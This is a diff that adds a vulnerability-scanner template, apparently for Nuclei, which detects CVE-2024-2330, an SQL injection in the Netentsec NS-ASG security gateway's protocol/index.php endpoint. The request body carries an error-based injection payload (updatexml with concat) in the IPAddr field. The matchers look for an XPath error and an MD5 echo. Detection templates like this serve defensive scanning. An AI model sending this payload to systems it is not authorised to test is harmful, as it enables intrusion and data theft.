@@ -1,0 +1,32 @@
+id: cve-2024-2330-sqli
+info:
+  name: 网康NS-ASG应用安全网关 index.php SQL Injection (CVE-2024-2330)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-2330,sqli
+
+variables:
+  t1: '{{rand_int(1000,9999)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/protocol/index.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select md5({{t1}}))),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
